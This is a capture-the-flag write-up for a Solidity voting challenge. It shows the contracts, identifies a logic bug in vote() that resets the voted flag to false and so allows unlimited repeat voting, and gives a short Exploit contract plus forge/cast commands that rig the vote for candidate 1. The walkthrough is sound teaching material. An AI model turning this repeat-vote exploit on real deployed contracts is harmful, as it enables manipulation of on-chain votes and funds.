This is some sort of voting, but it seems something is just not right? Well, let's see what the condition of *Setup.sol::isSolved()* &nbsp;  
&nbsp;  

```solidity
pragma solidity ^0.8.25;

import "./PrizePool.sol";
import "./Participants.sol";

contract Setup{
    PrizePoolBattle public immutable prizepool;
    Participant1 public immutable participant1;
    Participant2 public immutable participant2;
    Participant3 public immutable participant3;

    constructor() payable{
        require(msg.value >= 9 ether, "Need 9 ether to start challenge");
        prizepool = new PrizePoolBattle();
        participant1 = new Participant1{value: 5 ether}(address(prizepool));
        participant2 = new Participant2{value: 1 ether}(address(prizepool));
        participant3 = new Participant3{value: 3 ether}(address(prizepool));
    }

    function isSolved() public view returns(bool){
        (, uint winner) = prizepool.getWinner();
        return winner == 1;
    }

}
``` 
&nbsp;  

Well, the *isSolved()* function only returns true if the winner is the 1st party; we have to look into the *PrizePool Contract* to figure this out, but now let's analyze the constructor. It first deploys the *Prizepool Contract* and another 3 participants with each 5, 1, and 3 Ether, now that we know what the initial setup is, let's see what the *Participant Contract* is all about. &nbsp;  
&nbsp;  
```solidity
contract Participant1{
    PrizePoolBattle public immutable prizepool;

    constructor(address _target) payable{
        prizepool = PrizePoolBattle(_target);
        prizepool.addVoter{value: 5 ether}("Michelio");
        prizepool.vote(2);
    }
}
```
&nbsp;  
We are going to take a look at the first only since the other 2 are similar; it first calls the *addVote()* with 5 Ether and "**Michelio**" as name, I guess, and it votes for the 2nd Party, oh no, our competitor, it seems. Well, let's see the real deal now, the *Prizepool Contract* &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract PrizePoolBattle{
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }

    struct Voter {
        uint id;
        string name;
        uint256 weight;
        bool voted;
    }

    mapping(uint => Candidate) public candidates;
    mapping(uint => Voter) public voters;
    mapping(address => bool) public votersExist;
    mapping(address => uint) public votersID;
    uint public candidatesCount;
    uint public votersCount;
    uint public winner;
    bool public winnerDeclared = false;

    event Voted(address indexed voter, uint indexed candidateId);
    event Winner(uint indexed candidateId, string name);

    modifier checkWinner(uint _candidateId) {
        _;
        if (candidates[_candidateId].voteCount >= 10 ether) {
            winnerDeclared = true;
            winner = _candidateId;
            emit Winner(_candidateId, candidates[_candidateId].name);
        }
    }

    constructor() {
        addCandidate("ENUMA");
        addCandidate("ALPHA");
    }

    function addCandidate(string memory _name) internal {
        require(
            keccak256(abi.encodePacked(_name)) == keccak256(abi.encodePacked("ENUMA")) ||
            keccak256(abi.encodePacked(_name)) == keccak256(abi.encodePacked("ALPHA")),
            "Only ENUMA or ALPHA can be added as candidates"
        );
        candidatesCount++;
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
    }
}
```
&nbsp;  
Let's view it part by part to make it more understandable. The first part is, of course, the constructor. When this contract is deployed, it immediately calls the *addCandidate()* function. This function will add new candidates based on the *Id*, as we can see on the *Struct Candidate* on the first few lines. The *candidateCounts()* is the one responsible for giving the *Id*, and the party can only be either *ENUMA* or *ALPHA*. Based on the constructor, we know that *ENUMA* has the *Id* of 1 and *ALPHA* has the *Id* of 2. &nbsp;  
&nbsp;  
The modifier *checkWinner()* will check at the end of a function run; if a candidate has a vote of 10, it will declare the *winner*. Let's continue to the rest of the functions. &nbsp;  
&nbsp;  
```solidity
    function addVoter(string memory _name) public payable{
        require(!votersExist[msg.sender], "Voter has already been added.");
        votersCount++;
        uint256 weight = msg.value;
        voters[votersCount] = Voter(votersCount, _name, weight, false);
        votersID[msg.sender] = votersCount;
        votersExist[msg.sender] = true;
    }

    function vote(uint _candidateId) public checkWinner(_candidateId) {
        require(votersExist[msg.sender], "You are not an eligible voter.");
        require(!winnerDeclared, "The winner has already been declared.");
        require(_candidateId > 0 && _candidateId <= candidatesCount, "Invalid candidate ID.");
        uint id = votersID[msg.sender];
        require(voters[id].voted == false, "You already vote!");
        voters[id].voted = false;
        candidates[_candidateId].voteCount += voters[id].weight * 1;
        emit Voted(msg.sender, _candidateId);
    }

    function getCandidateVoteCount(uint _candidateId) public view returns (string memory name, uint voteCount) {
        Candidate storage candidate = candidates[_candidateId];
        return (candidate.name, candidate.voteCount);
    }

    function getWinner() public view returns(string memory name, uint id){
        Candidate storage candidate = candidates[winner];
        return (candidate.name, candidate.id);
    }
```
&nbsp;  
We got 4 functions here; the first one is *addVoter()*; this function seems to check whether someone is already registered or not, and after that, it will increase the *votersCount()* and push it to the struct of Voter. What we know here is that the weight of someone's vote is determined by the money they put in, and at the end, it ensures that we can only register once by changing the *votersExist()* to true. &nbsp;  
&nbsp;  
Next up is the *vote()* function. We can see that the modifier *checkWinner()* is implemented here, meaning this function will be the one that triggers the change. It first has 3 checks to check whether the voter exists, check if the winner has been selected, and the one we voted to be either 1 or 2 only. We can see there it will get our ID and check whether we already vote or not by checking the *voted* attribute on our struct if it's already *true*, but here is the strange thing: after the check, instead of setting the *voted* to true, it resets us to *false*, meaning even if we have a very low weight, we can vote multiple times! Here is the logic error bug! &nbsp;  
&nbsp;  
The next 2 functions are only for getting the state of the vote count anytime and the winner if the winner is selected. So let's wrap up about what we have now. &nbsp;  
&nbsp;  

- Party Number 2 (*ALPHA*) has 9 Votes already (5 + 1 +3) from other Participants
- Party Number 1 (*ENUMA*) has 0 Vote
- We only have 1.2 Ether (based on *cast balance*)
- We have a logic error where we can vote unlimitedly. &nbsp;  
&nbsp;  

We have 2 choices here: we can do it manually by registering via *addVoter()* and send the vote 10 times, or we can make a smart contract that does that. In this approach, I'm going to create a smart contract that does just that, and here is the code. &nbsp;  
&nbsp;  
```solidity
pragma solidity ^0.8.25;

import "./PrizePool.sol";
import "./Setup.sol";

contract Exploit{
    Setup public setup;
    PrizePoolBattle public pp;

    constructor(address payable _setup) payable{
        setup = Setup(_setup);
        pp = PrizePoolBattle(address(setup.prizepool()));
    }

    function exploit() public {
        pp.addVoter{value: 1 ether}("Louis");
        for(uint a = 0 ; a < 10 ; a++){
            pp.vote(1);
        }
    }

}
```
&nbsp;  
Here is how we can deploy our Exploit contract and solve the lab &nbsp;  
&nbsp;  
```bash
// Deploying the Exploit
forge create src/voting-frenzy/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --construcot-args $SETUP_ADDR --value 1ether

// Exploit the Contract
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"
```
&nbsp;  
Running the command above, you should've exploited the contract and gotten your flag.